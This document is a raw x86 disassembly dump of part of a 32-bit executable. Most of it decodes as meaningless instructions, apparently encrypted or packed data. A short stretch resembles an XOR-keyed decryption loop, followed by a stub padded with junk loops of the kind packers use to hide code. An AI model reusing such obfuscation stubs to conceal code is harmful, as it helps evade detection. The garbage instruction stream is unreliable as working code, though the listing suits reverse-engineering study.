  403134:	adc    eax,0x9c9eaa06
  403139:	mov    edi,0xebe52ed2
  40313e:	xchg   ecx,eax
  40313f:	push   edi
  403140:	add    BYTE PTR ds:0x8e5b0424,bl
  403146:	push   ebp
  403147:	or     eax,0x2b7a0055
  40314c:	sub    DWORD PTR [ebp-0x45],edi
  40314f:	sub    eax,0x31d39e49
  403154:	xchg   esi,eax
  403155:	shl    BYTE PTR [ebp+0x77],cl
  403158:	jns    0x403167
  40315a:	es stos BYTE PTR es:[edi],al
  40315c:	jg     0x40313e
  40315e:	xchg   edx,eax
  40315f:	pop    ecx
  403160:	pop    edi
  403161:	jns    0x4030ea
  403163:	sbb    al,0x64
  403165:	jbe    0x403161
  403167:	cld    
  403168:	ret    0x6679
  40316b:	call   0xaf8dd37a
  403170:	jmp    WORD PTR [edx-0x501500fa]
  403177:	das    
  403178:	mov    bl,0x2
  40317a:	or     BYTE PTR [ebx],ch
  40317c:	cs inc edi
  40317e:	adc    BYTE PTR ds:0xaf924469,ch
  403184:	jo     0x4031ca
  403186:	cmp    al,0x9e
  403189:	lods   eax,DWORD PTR ds:[esi]
  40318a:	mov    eax,ds:0x349d0df8
  40318f:	xchg   esp,eax
  403190:	inc    edi
  403191:	xor    edx,DWORD PTR [ebx]
  403193:	je     0x4031ab
  403195:	dec    ecx
  403196:	fisttp WORD PTR [edi+0x1a]
  403199:	mov    al,0xd0
  40319b:	dec    esp
  40319c:	inc    DWORD PTR [ebx+0x48]
  40319f:	iret   
  4031a0:	pop    esi
  4031a1:	jae    0x403149
  4031a3:	add    DWORD PTR [edx-0x7c1abdc6],esp
  4031a9:	pop    ss
  4031aa:	push   ds
  4031ab:	les    eax,FWORD PTR [ebx-0x73]
  4031ae:	or     al,0xa1
  4031b0:	xor    esp,edx
  4031b2:	mov    eax,ds:0x21381c32
  4031b7:	adc    BYTE PTR [edx],bl
  4031b9:	pop    es
  4031ba:	and    DWORD PTR [ebp-0x5f],ebp
  4031bd:	sahf   
  4031be:	xor    cl,BYTE PTR [ecx+edi*8+0x17]
  4031c2:	mov    ebx,0xd59ce898
  4031c7:	iret   
  4031c8:	pop    es
  4031c9:	clc    
  4031ca:	cdq    
  4031cb:	push   0xffffff88
  4031cd:	mov    ds:0xf1f69198,eax
  4031d2:	adc    ch,0x43
  4031d5:	mov    ds:0xfec8fc9c,eax
  4031da:	addr16 fwait
  4031dc:	ds sbb ebx,edi
  4031df:	sar    bh,0xde
  4031e2:	push   ss
  4031e3:	jb     0x40316c
  4031e5:	mov    DWORD PTR [esi+0x25],ebx
  4031e8:	mov    esp,0xa50f7d6c
  4031ed:	loop   0x403183
  4031ef:	and    edi,ecx
  4031f1:	mov    cl,0xf2
  4031f3:	in     eax,dx
  4031f4:	mov    al,0x8f
  4031f6:	jp     0x4031f3
  4031f8:	das    
  4031f9:	pop    esp
  4031fa:	sub    al,0x59
  4031fc:	fidiv  WORD PTR [edi+0x38]
  4031ff:	jne    0x40319f
  403201:	int    0xc6
  403203:	jnp    0x403238
  403205:	or     al,0xd5
  403207:	vmwrite ecx,DWORD PTR [esi-0x5ea66da0]
  40320e:	adc    DWORD PTR [ebx+0x6f31a11],edi
  403214:	mov    esi,0x6c86f5f2
  403219:	test   eax,0x2ef2da0c
  40321e:	dec    ecx
  40321f:	push   0xb017a7c0
  403224:	sub    DWORD PTR [ebp+0x5a],esi
  403227:	and    BYTE PTR [ecx+esi*8-0x38fe65b],0x1c
  40322f:	stc    
  403230:	cmp    eax,0xd8318c8e
  403235:	and    DWORD PTR [eax+0x44],edx
  403238:	aam    0xa
  40323a:	fld    QWORD PTR es:[ebp-0x7d5a3f59]
  403241:	push   ecx
  403242:	xor    al,0x30
  403244:	or     DWORD PTR [edi-0x6f],esp
  403247:	pshufw mm5,QWORD PTR [edx-0x942cf26],0x6d
  40324f:	push   esp
  403250:	jae    0x403234
  403252:	ins    BYTE PTR es:[edi],dx
  403253:	fadd   QWORD PTR [eax]
  403255:	push   ebx
  403256:	cmp    al,0xe9
  403258:	mov    bh,0x1d
  40325a:	add    al,0x56
  40325c:	xchg   DWORD PTR [eax],esp
  40325e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40325f:	mov    esp,0xaa960145
  403264:	dec    esp
  403265:	cmp    esp,0x2100d943
  40326b:	(bad)  
  40326c:	mov    bl,0x99
  40326e:	push   ebp
  40326f:	aam    0xcb
  403271:	fistp  QWORD PTR [ebp+0x22]
  403274:	push   esi
  403275:	mov    bl,0x29
  403277:	lock ret 
  403279:	push   ds
  40327a:	sub    DWORD PTR [esi-0x7bfec721],ebp
  403280:	cmc    
  403281:	inc    edx
  403282:	in     al,0xcc
  403284:	outs   dx,BYTE PTR ds:[esi]
  403285:	enter  0x6fcd,0x4e
  403289:	adc    DWORD PTR [edx+eiz*4],ebp
  40328c:	out    0x4,eax
  40328e:	or     al,0xb9
  403290:	cli    
  403291:	js     0x403262
  403293:	xchg   DWORD PTR [edx+0x30cae8a5],esp
  403299:	hlt    
  40329a:	lock hlt 
  40329c:	or     DWORD PTR [ecx*1-0x56f06ff4],0x4377f9ea
  4032a7:	mov    esi,0x42e79cc8
  4032ac:	aam    0x30
  4032ae:	sub    DWORD PTR [ecx],ebp
  4032b0:	cdq    
  4032b1:	call   0x43db:0x43bd6703
  4032b8:	stos   BYTE PTR es:[edi],al
  4032b9:	not    BYTE PTR [edx]
  4032bb:	test   ch,0x92
  4032be:	or     ecx,DWORD PTR [ecx+ebx*2-0x61118131]
  4032c5:	push   ds
  4032c6:	cmp    bh,ah
  4032c8:	lock les esp,FWORD PTR [edi-0x5636853d]
  4032cf:	dec    ebx
  4032d0:	add    DWORD PTR [edi],esi
  4032d2:	and    dl,dl
  4032d4:	push   0xfffffffc
  4032d6:	mov    BYTE PTR [esi],dh
  4032d8:	inc    ebp
  4032d9:	ja     0x403297
  4032db:	xchg   edi,eax
  4032dc:	xlat   BYTE PTR ds:[ebx]
  4032dd:	dec    ebp
  4032de:	es jmp 0x58f4:0xebdc0b
  4032e6:	mov    ds:0xe0969566,eax
  4032eb:	adc    DWORD PTR [edi-0x88d060a],eax
  4032f1:	fisttp QWORD PTR [edi+0x7a]
  4032f4:	mov    al,ds:0xf7430d73
  4032f9:	inc    ebp
  4032fa:	mov    ebp,0xaab60e8f
  4032ff:	add    BYTE PTR [edx-0x79],dl
  403302:	mov    edx,0xc758197f
  403307:	sub    DWORD PTR [esi-0x5829e95d],ecx
  40330d:	jo     0x4032f2
  40330f:	shl    dl,cl
  403311:	pop    esi
  403312:	in     al,dx
  403313:	jmp    0x4032d7
  403315:	call   0x84f66be9
  40331a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40331b:	sub    DWORD PTR [ebp-0x18],ecx
  40331e:	call   0x352a:0x3628d092
  403325:	cmp    ch,BYTE PTR [edx]
  403327:	adc    ebx,ecx
  403329:	pop    ss
  40332a:	sub    DWORD PTR [edx+0x30e27088],esi
  403330:	jmp    0xc7f8f156
  403335:	mov    ecx,DWORD PTR [esi+0x74cd2a04]
  40333b:	mov    al,0x71
  40333d:	imul   DWORD PTR [ecx-0x2d]
  403340:	fdecstp 
  403342:	and    al,0xa3
  403344:	jge    0x403350
  403346:	xchg   BYTE PTR [edi],cl
  403348:	adc    eax,0x5eddb436
  40334d:	fimul  DWORD PTR [edx-0x6de079c3]
  403353:	aad    0xa6
  403355:	inc    edi
  403356:	push   esi
  403357:	rcr    esp,cl
  403359:	(bad)  
  40335a:	stc    
  40335b:	sub    eax,DWORD PTR [edi]
  40335d:	outs   dx,BYTE PTR ds:[si]
  40335f:	cs add bh,al
  403362:	gs stos BYTE PTR es:[edi],al
  403364:	in     eax,0x85
  403366:	xchg   esi,eax
  403367:	xchg   esp,eax
  403368:	adc    BYTE PTR [eax+0x47],cl
  40336b:	and    al,0x5b
  40336d:	mov    ds:0xa9d2e19c,eax
  403372:	mov    BYTE PTR [esp+ebp*8-0x1d04a631],al
  403379:	test   esp,esi
  40337b:	int3   
  40337c:	mov    al,0xee
  40337e:	jg     0x40335b
  403380:	and    DWORD PTR [ebx],ebp
  403382:	sti    
  403383:	rcr    DWORD PTR [edx-0x2a40bba],0xd2
  40338a:	out    0x19,al
  40338c:	cli    
  40338d:	test   DWORD PTR [ecx],edi
  40338f:	jmp    0x4033a2
  403391:	sti    
  403392:	mov    DWORD PTR [eax-0x41ba4120],ebx
  403398:	jle    0x4033e8
  40339a:	mov    eax,ds:0xf08758b
  40339f:	scas   eax,DWORD PTR es:[edi]
  4033a0:	cli    
  4033a1:	mov    ebx,DWORD PTR [ebp+0xc]
  4033a4:	xor    eax,ecx
  4033a6:	add    eax,edx
  4033a8:	jmp    0x403687
  4033ad:	jecxz  0x4033d3
  4033af:	fcom   DWORD PTR [edx]
  4033b1:	out    0xd2,eax
  4033b3:	icebp  
  4033b4:	icebp  
  4033b5:	pop    es
  4033b6:	xchg   edx,eax
  4033b7:	aaa    
  4033b8:	aas    
  4033b9:	jg     0x40336d
  4033bb:	dec    eax
  4033bc:	cmc    
  4033bd:	cmp    dl,BYTE PTR [eax+esi*2]
  4033c0:	jo     0x403380
  4033c2:	jle    0x403434
  4033c4:	jo     0x4033c3
  4033c6:	mov    ecx,0x9ef1e05b
  4033cb:	mov    bh,0x63
  4033cd:	popa   
  4033ce:	sahf   
  4033cf:	xor    ebp,DWORD PTR [ebp+0x59]
  4033d2:	adc    eax,0xa03bf784
  4033d7:	cs ins DWORD PTR es:[edi],dx
  4033d9:	add    dl,bh
  4033db:	jnp    0x4033fc
  4033dd:	push   edx
  4033de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4033df:	fidiv  DWORD PTR [edi]
  4033e1:	push   cs
  4033e2:	imul   esi,DWORD PTR [esi-0x5d0fa66b],0x63
  4033e9:	out    dx,eax
  4033ea:	loopne 0x403443
  4033ec:	aas    
  4033ed:	(bad)  
  4033ee:	(bad)  
  4033ef:	adc    al,0xeb
  4033f1:	arpl   WORD PTR [ebx-0x7f],ax
  4033f4:	nop
  4033f5:	or     cl,BYTE PTR [ecx-0x5d25f9d9]
  4033fb:	in     al,dx
  4033fc:	xlat   BYTE PTR ds:[ebx]
  4033fd:	in     eax,dx
  4033fe:	and    ah,BYTE PTR [eax-0x222d86fe]
  403404:	icebp  
  403405:	ins    BYTE PTR es:[edi],dx
  403406:	div    DWORD PTR [edi-0x50]
  403409:	bound  eax,QWORD PTR [ebp+0x64]
  40340c:	test   dl,0x4a
  40340f:	push   ds
  403410:	pop    esi
  403411:	icebp  
  403412:	inc    edx
  403413:	loop   0x40345f
  403415:	adc    dl,BYTE PTR [ecx-0x73]
  403418:	sbb    eax,0xa6b58f87
  40341d:	iret   
  40341e:	dec    edx
  40341f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403420:	push   0xfffffff4
  403422:	mov    dh,0xb
  403424:	aas    
  403425:	push   ds
  403426:	dec    edi
  403427:	push   ebp
  403428:	sub    ah,bh
  40342a:	int3   
  40342b:	daa    
  40342c:	jp     0x40342e
  40342e:	div    BYTE PTR [eax]
  403430:	pop    ecx
  403431:	fidivr WORD PTR [eax+eax*1+0x4a]
  403435:	dec    ecx
  403436:	sbb    bl,BYTE PTR [esi+esi*2-0x6a]
  40343a:	jecxz  0x4033cb
  40343c:	pop    ebx
  40343d:	add    ecx,DWORD PTR [eax+0x16b184b2]
  403443:	bound  edx,QWORD PTR [edx+0x78]
  403446:	shr    DWORD PTR [edx+0x10bfb91b],1
  40344c:	aad    0x37
  40344e:	in     eax,dx
  40344f:	(bad)  
  403450:	jmp    0xf9c318d8
  403455:	or     BYTE PTR ds:0x10bebe40,bh
  40345b:	sbb    al,0xb9
  40345d:	adc    eax,0x6a1e1dd
  403462:	jp     0x403405
  403464:	fnstsw WORD PTR [ebp+eax*1-0x739df818]
  40346b:	pop    es
  40346c:	ficom  WORD PTR [edx]
  40346e:	fsubr  QWORD PTR [eax]
  403470:	jmp    0x2be2:0xd24691a3
  403477:	add    bh,ch
  403479:	jo     0x40341a
  40347b:	adc    eax,0x9c751901
  403480:	dec    esi
  403481:	sub    al,0x8
  403483:	aad    0x8e
  403485:	adc    eax,0xb0026a1a
  40348a:	mov    bh,0x38
  40348c:	jb     0x403482
  40348e:	jae    0x4034f9
  403490:	cld    
  403491:	and    ecx,eax
  403493:	or     al,0x60
  403495:	sbb    dh,0x5d
  403498:	mov    ecx,0xda13cce2
  40349d:	in     al,dx
  40349e:	leave  
  40349f:	add    BYTE PTR [ebp+0x587ff61c],0x97
  4034a6:	dec    ebx
  4034a7:	ja     0x403490
  4034a9:	jecxz  0x4034b6
  4034ab:	pushf  
  4034ac:	pop    esi
  4034ad:	pop    ebp
  4034ae:	mov    edx,0xc9559ce0
  4034b3:	scas   al,BYTE PTR es:[edi]
  4034b4:	mov    eax,ds:0x3bf001f4
  4034b9:	push   ebx
  4034ba:	ret    
  4034bb:	cli    
  4034bc:	mov    ecx,0xaf7366cf
  4034c1:	daa    
  4034c2:	mov    cl,0x41
  4034c4:	fist   DWORD PTR [ebp-0x5b3d97bb]
  4034ca:	out    0x42,al
  4034cc:	inc    eax
  4034cd:	and    bl,al
  4034cf:	add    BYTE PTR [ebx-0x325c770c],0x14
  4034d6:	adc    al,0x1e
  4034d8:	(bad)  
  4034d9:	pop    ss
  4034da:	gs sahf 
  4034dc:	and    al,0xf6
  4034de:	scas   al,BYTE PTR es:[edi]
  4034df:	ss jbe 0x40353d
  4034e2:	enter  0xba,0x0
  4034e6:	jns    0x4034bf
  4034e8:	test   DWORD PTR [eax],edi
  4034ea:	jge    0x4034b3
  4034ec:	stc    
  4034ed:	xchg   esp,eax
  4034ee:	fcom   QWORD PTR [ebp+0x68]
  4034f1:	cdq    
  4034f2:	mov    es,WORD PTR [edx+eax*2+0x5d]
  4034f6:	inc    eax
  4034f7:	push   eax
  4034f8:	das    
  4034f9:	mov    ss:0xc8e5343d,eax
  4034ff:	push   ss
  403500:	pop    esi
  403501:	push   edx
  403502:	jns    0x4034e1
  403504:	jbe    0x4034f7
  403506:	leave  
  403507:	xchg   ecx,eax
  403508:	stos   BYTE PTR es:[edi],al
  403509:	and    BYTE PTR [edx-0x1bdeb5e5],0xa4
  403510:	call   0xd4a3:0xdbae4b91
  403517:	pop    ss
  403518:	adc    eax,0xcc6793c2
  40351d:	sahf   
  40351e:	lds    ebx,FWORD PTR [edx]
  403520:	jge    0x4034d8
  403522:	push   es
  403523:	inc    eax
  403524:	inc    esi
  403525:	mov    DWORD PTR [ecx-0x1c],ecx
  403528:	lods   eax,DWORD PTR ds:[esi]
  403529:	and    esp,DWORD PTR [ecx]
  40352b:	scas   al,BYTE PTR es:[edi]
  40352c:	retf   
  40352d:	mov    esi,0x1ef28baf
  403532:	nop
  403533:	aam    0x69
  403535:	xchg   ebx,eax
  403536:	pop    edi
  403537:	lahf   
  403538:	jne    0x403505
  40353a:	icebp  
  40353b:	scas   eax,DWORD PTR es:[edi]
  40353c:	lock inc edx
  40353e:	jb     0x4034e5
  403540:	inc    eax
  403541:	jecxz  0x403588
  403543:	xor    eax,0xc3f3240c
  403548:	cli    
  403549:	push   ds
  40354a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40354b:	inc    eax
  40354c:	pop    ss
  40354d:	and    eax,0x90496b73
  403552:	int3   
  403553:	retf   
  403554:	jg     0x40353e
  403556:	shr    DWORD PTR [ebp+0x7b86850e],cl
  40355c:	arpl   WORD PTR [edx],di
  40355e:	xor    eax,0xe552ba88
  403563:	stc    
  403564:	or     esi,DWORD PTR [ecx+0x423c7a4b]
  40356a:	(bad)  
  40356b:	in     eax,0xd0
  40356d:	cmp    BYTE PTR [eax-0x2e],bh
  403570:	mov    esi,0x59161b4f
  403575:	mov    edx,0x540a0396
  40357a:	arpl   WORD PTR [esi+edi*2+0x1],bx
  40357e:	adc    cl,BYTE PTR cs:[edi+0x40]
  403582:	sahf   
  403583:	and    BYTE PTR [eax],dh
  403585:	jbe    0x403515
  403587:	lahf   
  403588:	sti    
  403589:	xchg   ecx,eax
  40358a:	(bad)  
  40358c:	mov    dl,0x69
  40358e:	or     BYTE PTR [ebx-0x6a0b1adf],cl
  403594:	popa   
  403595:	and    DWORD PTR [ebp+0x18],esi
  403598:	pop    edi
  403599:	xor    eax,0x50eb54fb
  40359e:	pushf  
  40359f:	jbe    0x40356a
  4035a1:	retf   
  4035a2:	dec    ebx
  4035a3:	xchg   BYTE PTR [esp+ebp*2-0x6c],bl
  4035a7:	mov    ebx,0x5fae50ce
  4035ac:	push   ds
  4035ad:	rcl    bh,1
  4035af:	cmp    eax,0x21917cc2
  4035b4:	xor    al,0xc1
  4035b6:	dec    esi
  4035b7:	mov    edi,0xbfa93b5b
  4035bc:	jb     0x40355f
  4035be:	mov    edx,0xe7cef376
  4035c3:	ds jmp 0x8282c990
  4035c9:	and    DWORD PTR [edi],0x28883d63
  4035cf:	pop    eax
  4035d0:	fs xchg ebp,eax
  4035d2:	sub    ah,ch
  4035d4:	inc    esi
  4035d5:	fild   QWORD PTR [eax-0xc2993f]
  4035db:	inc    ecx
  4035dc:	push   0xffffffe7
  4035de:	mov    al,ds:0x42a2323b
  4035e3:	add    ecx,DWORD PTR [esp+edx*8]
  4035e6:	sub    DWORD PTR [ecx-0x596f42ef],esp
  4035ec:	fiadd  DWORD PTR [ebp-0x4c]
  4035ef:	xchg   esi,eax
  4035f0:	sub    cl,bl
  4035f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4035f3:	jb     0x40359f
  4035f5:	mov    bh,0xe3
  4035f7:	sub    eax,0xc9ba9162
  4035fc:	cmp    ecx,DWORD PTR [ecx+0x4]
  4035ff:	ret    0x1516
  403602:	popf   
  403603:	fld    QWORD PTR [edi]
  403605:	fstp   TBYTE PTR [ebp+0x71c08c2e]
  40360b:	arpl   WORD PTR [edi],bx
  40360d:	xor    edx,DWORD PTR [edi+0x12d8de7b]
  403613:	into   
  403614:	push   ebp
  403615:	fucomp st(0)
  403617:	fnstsw WORD PTR [edi-0x4a]
  40361a:	xchg   BYTE PTR [esi-0x19],dl
  40361d:	or     al,0xdb
  40361f:	or     al,0x7
  403621:	add    BYTE PTR [ecx+0xd08c678],al
  403627:	xlat   BYTE PTR ds:[ebx]
  403628:	inc    esi
  403629:	push   cs
  40362a:	fnstcw WORD PTR [esi+0x492ca2c0]
  403630:	sbb    al,0xae
  403632:	or     eax,0x68a4ec00
  403637:	jno    0x403629
  403639:	clc    
  40363a:	jge    0x40367e
  40363c:	repnz out dx,eax
  40363e:	cmp    BYTE PTR [esi-0x11],cl
  403641:	shl    dh,cl
  403643:	imul   edx,DWORD PTR [ecx+0x7],0xc4a1a7bc
  40364a:	pop    esi
  40364b:	push   ebx
  40364c:	pop    ebx
  40364d:	repnz dec edi
  40364f:	pop    edx
  403650:	mov    BYTE PTR [eax+0x78],bl
  403653:	xchg   esi,eax
  403654:	mov    BYTE PTR [edx],0x57
  403657:	fwait
  403658:	xor    edi,DWORD PTR [esi]
  40365a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40365b:	push   esp
  40365c:	in     al,0x37
  40365e:	add    esp,eax
  403660:	inc    ecx
  403661:	sbb    dl,BYTE PTR [ecx+0x19]
  403664:	test   BYTE PTR [eax],0xf6
  403667:	sub    cl,BYTE PTR [eax+0x49]
  40366a:	mov    edx,0xd25014ca
  40366f:	sti    
  403670:	sti    
  403671:	lods   eax,DWORD PTR ds:[esi]
  403672:	push   ecx
  403673:	jle    0x4036f0
  403675:	outs   dx,DWORD PTR ds:[esi]
  403676:	pop    ds
  403677:	xlat   BYTE PTR ds:[ebx]
  403678:	loop   0x403650
  40367a:	jb     0x403609
  40367c:	xor    ebx,esp
  40367e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40367f:	imul   ebp,ecx,0xfffffffe
  403682:	bnd jo 0x40368b
  403685:	push   esp
  403686:	xchg   esp,eax
  403687:	mov    al,BYTE PTR [ebx+eax*1+0x32729c]
  40368e:	mov    BYTE PTR [edi+esi*1],al
  403691:	mov    eax,DWORD PTR [ebp-0x4]
  403694:	xor    eax,ecx
  403696:	lea    edx,[edx+eax*1+0x32729c]
  40369d:	mov    eax,DWORD PTR [ebp-0x4]
  4036a0:	xor    eax,ecx
  4036a2:	mov    esi,0xffcd8d64
  4036a7:	sub    esi,eax
  4036a9:	add    esi,DWORD PTR [ebp+0x10]
  4036ac:	cmp    edx,esi
  4036ae:	jbe    0x4030ad
  4036b4:	pop    ebx
  4036b5:	mov    eax,0xf89c8530
  4036ba:	pop    edi
  4036bb:	pop    esi
  4036bc:	leave  
  4036bd:	ret    0xc
  4036c0:	push   ebp
  4036c1:	mov    ebp,esp
  4036c3:	sub    esp,0x58
  4036c6:	mov    DWORD PTR ds:0x42fc6d,0x17
  4036d0:	cmp    DWORD PTR ds:0x42fc6d,0x0
  4036d7:	je     0x40372c
  4036dd:	cmp    DWORD PTR ds:0x42fc6d,0x7
  4036e4:	jne    0x4036fc
  4036ea:	push   0x0
  4036ec:	push   0x25f8
  4036f1:	push   0x8523
  4036f6:	call   DWORD PTR ds:0x42e257
  4036fc:	cmp    DWORD PTR ds:0x42fc6d,0x8
  403703:	jne    0x403717
  403709:	xor    eax,eax
  40370b:	or     eax,DWORD PTR ds:0x42fc6d
  403711:	dec    eax
  403712:	mov    ds:0x42fc6d,eax
  403717:	mov    eax,ds:0x42fc6d
  40371c:	dec    eax
  40371d:	mov    ds:0x42fc6d,eax
  403722:	jmp    0x4036d0
  403727:	adc    eax,0xdf
  40372c:	mov    ecx,DWORD PTR [ebp+0x8]
  40372f:	add    DWORD PTR ds:0x42e673,0x693e
  403739:	mov    eax,0x8a3e
  40373e:	adc    DWORD PTR ds:0x42e677,0x5ea2
  403748:	xor    ax,WORD PTR [ecx+0x20]
  40374c:	adc    DWORD PTR ds:0x42fc8d,ecx
  403752:	mov    ecx,0x3b04
  403757:	and    DWORD PTR ds:0x42e693,0x42e09c
  403761:	add    ax,cx
  403764:	mov    DWORD PTR ds:0x42fcfa,0x1b71
  40376e:	movzx  eax,ax
  403771:	mov    DWORD PTR [ebp-0xc],eax
  403774:	or     DWORD PTR ds:0x42e0a4,0x7677
  40377e:	mov    BYTE PTR [ebp-0x1],0x7f
  403782:	not    ecx
  403784:	lea    eax,[ebp-0x1]
  403787:	mov    DWORD PTR [ebp-0x10],eax
  40378a:	or     DWORD PTR ds:0x42e68f,ecx
  403790:	jmp    0x403af0
  403795:	out    0x52,eax
  403797:	out    0x78,al
  403799:	jno    0x40374f
  40379b:	in     eax,0x71
  40379d:	or     BYTE PTR [edx+0x68],bl
  4037a0:	and    DWORD PTR [eax-0x6b],esp
  4037a3:	push   edx
  4037a4:	sahf   
  4037a5:	js     0x4037b8
  4037a7:	jo     0x403819
  4037a9:	cmp    eax,0xca70707d
  4037ae:	add    BYTE PTR [ebx],dl
  4037b0:	cmp    BYTE PTR [edi+0x26209489],cl
  4037b6:	loopne 0x4037db
  4037b8:	lods   al,BYTE PTR ds:[esi]
  4037b9:	add    ebx,DWORD PTR [eax-0x2645f845]
  4037bf:	xchg   esp,eax
  4037c0:	push   eax
  4037c1:	js     0x4037f1
  4037c3:	addr16 pop ss
  4037c5:	xor    eax,DWORD PTR [edx]
  4037c7:	pusha  
  4037c8:	sub    cl,ch
  4037ca:	add    ch,BYTE PTR ds:[esi+0x5225f47]
  4037d1:	mov    esp,0xe0c922dc
  4037d6:	inc    esp
  4037d7:	pusha  
  4037d8:	and    BYTE PTR [ebx+0x8],ah
  4037db:	stc    
  4037dc:	adc    DWORD PTR [edi-0x389dee],ecx
  4037e2:	dec    edi
  4037e3:	mov    WORD PTR [ebx-0x6dc2eb7],fs
  4037e9:	sbb    al,BYTE PTR [edx+0x6b]
  4037ec:	daa    
  4037ed:	push   edi
  4037ee:	in     eax,dx
  4037ef:	iret   
  4037f0:	sub    al,0xb0
  4037f2:	(bad)  
  4037f3:	push   ebx
  4037f4:	jne    0x4037f8
  4037f6:	dec    edi
  4037f7:	out    0x41,al
  4037f9:	xchg   esp,eax
  4037fa:	mov    esi,0x438bbd96
  4037ff:	inc    esp
  403800:	outs   dx,BYTE PTR ds:[esi]
  403801:	in     eax,dx
  403802:	jmp    DWORD PTR [esi+esi*4+0x73]
  403806:	mov    cl,0xbb
  403808:	fistp  DWORD PTR [ebx]
  40380a:	jecxz  0x40380e
  40380c:	jle    0x40382b
  40380e:	sbb    DWORD PTR ss:[edx+0x28],ecx
  403812:	or     eax,0xe6451aae
  403817:	mov    al,0x51
  403819:	jp     0x403821
  40381b:	sbb    al,0x6a
  40381d:	mov    WORD PTR [esi+0x795188b5],es
  403823:	pop    ss
  403824:	out    dx,al
  403825:	mov    WORD PTR [edi+0x76],ds
  403828:	add    eax,0x964745d3
  40382d:	imul   ebx,DWORD PTR [ebp+0x102946c],0xffffffd3
  403834:	lods   al,BYTE PTR ds:[esi]
  403835:	sbb    BYTE PTR [ecx+0x4a],0xc5
  403839:	inc    edi
  40383a:	int3   
  40383b:	push   ebp
  40383c:	pop    edx
  40383d:	cmp    BYTE PTR [ecx],al
  40383f:	ss mov ch,0x82
  403842:	aad    0x2c
  403844:	sbb    BYTE PTR [ebx-0x5a4c34d2],cl
  40384a:	cmp    dh,BYTE PTR [ecx+0x14157c72]
  403850:	es cli 
  403852:	cmc    
  403853:	pop    ds
  403854:	fild   QWORD PTR [ecx-0x5e854dff]
  40385a:	hlt    
  40385b:	outs   dx,BYTE PTR ds:[esi]
  40385c:	outs   dx,DWORD PTR ds:[esi]
  40385d:	pop    eax
  40385e:	push   ebp
  40385f:	lods   eax,DWORD PTR ds:[esi]
  403860:	sub    DWORD PTR [eax-0x6],esp
  403863:	jns    0x403830
  403865:	sbb    eax,ebp
  403867:	push   esp
  403868:	and    DWORD PTR [ecx+0x13],eax
  40386b:	pushf  
  40386c:	xchg   edx,eax
  40386d:	xor    edi,eax
  40386f:	jmp    0xe6c0:0xfb8301ba
  403876:	sub    eax,0xcf825f50
  40387b:	push   0x52d6fef5
  403880:	fnsave [edi]
  403882:	push   ebp
  403883:	test   DWORD PTR [ecx+ecx*2+0x400293e7],0xcab988d8
  40388e:	scas   al,BYTE PTR es:[edi]
  40388f:	jb     0x40383a
  403891:	fst    DWORD PTR [esi]
  403893:	repnz mov al,0x3a
  403896:	xchg   esi,eax
  403897:	or     BYTE PTR [edi],0x26
  40389a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40389b:	xchg   ebp,eax
  40389c:	out    0x19,eax
  40389e:	push   cs
  40389f:	retf   0xb318
  4038a2:	fcmovnbe st,st(2)
  4038a4:	push   edx
  4038a5:	inc    esi
  4038a6:	jecxz  0x4038c7
  4038a8:	push   ecx
  4038a9:	sbb    ch,BYTE PTR [edi+0x4d]
  4038ac:	ja     0x4038ed
  4038ae:	xor    eax,DWORD PTR [ecx]
  4038b0:	adc    eax,0xaff8a2cf
  4038b5:	xor    ebp,DWORD PTR [edi+edi*1+0x57923c9d]
  4038bc:	push   ss
  4038bd:	dec    ebp
  4038be:	retf   
  4038bf:	cmp    bh,BYTE PTR [eax]
  4038c1:	outs   dx,BYTE PTR ds:[esi]
  4038c2:	mov    bh,0x82
  4038c4:	jmp    0x403892
  4038c6:	aad    0x55
  4038c8:	ds jno 0x4038d2
  4038cb:	pop    edx
  4038cc:	sbb    BYTE PTR [esi],dl
  4038ce:	sbb    eax,0xecc39be3
  4038d3:	mov    ecx,0x945ac954
  4038d8:	jle    0x403955
  4038da:	pop    ebp
  4038db:	jp     0x4038c0
  4038dd:	sub    esp,esi
  4038df:	inc    edx
  4038e0:	adc    BYTE PTR [ebx+0x6],dl
  4038e3:	sahf   
  4038e4:	push   edx
  4038e5:	(bad)  
  4038e6:	fist   WORD PTR [eax-0x2dd5aa0]
  4038ec:	icebp  
  4038ed:	push   ebx
  4038ee:	mov    ds:0xeadb0411,eax
  4038f3:	jmp    0x4038ed
  4038f5:	popf   
  4038f6:	mov    WORD PTR [edx-0x61],cs
  4038f9:	or     BYTE PTR [ecx-0x3f],bl
  4038fc:	mov    bl,0x79
  4038fe:	or     BYTE PTR [ebx-0x2c],dh
  403901:	lds    edi,FWORD PTR [esi-0x23]
  403904:	or     al,0x94
  403906:	push   ebp
  403907:	ds xor eax,0x120d6a98
  40390d:	cmp    DWORD PTR [edi+0x4e40d2da],esi
  403913:	call   0xf96b:0x1776af0a
  40391a:	adc    DWORD PTR [ebp+0x2b863039],ecx
  403920:	ins    DWORD PTR es:[edi],dx
  403921:	cmp    al,0xfd
  403923:	jmp    0x40399c
  403925:	test   eax,0xbf470c84
  40392a:	pop    es
  40392b:	mov    al,ds:0xabbfc36
  403930:	fist   WORD PTR ds:0xbce22cd9
  403937:	add    eax,0x8b28c6a2
  40393c:	xor    BYTE PTR [eax-0x761cc936],bl
  403942:	push   esp
  403943:	jb     0x403970
  403945:	bound  edi,QWORD PTR [edi+0x1a]
  403948:	(bad)  
  403949:	sti    
  40394a:	mov    ds:0xc94aeea9,eax
  40394f:	mov    DWORD PTR [ebx+0x4e],0x663ce35b
  403956:	jl     0x403948
  403958:	leave  
  403959:	push   edi
  40395a:	jg     0x403942
  40395c:	mov    al,0x0
  40395e:	(bad)  
  40395f:	jns    0x4039b9
  403961:	jnp    0x40395f
  403963:	pop    ds
  403964:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403965:	xchg   ecx,ecx
  403967:	cmp    ebx,edx
  403969:	(bad)  
  40396a:	ja     0x4039b7
  40396c:	call   0x56f1:0xe1195672
  403973:	test   BYTE PTR [eax],ah
  403975:	aaa    
  403976:	call   0xf873f769
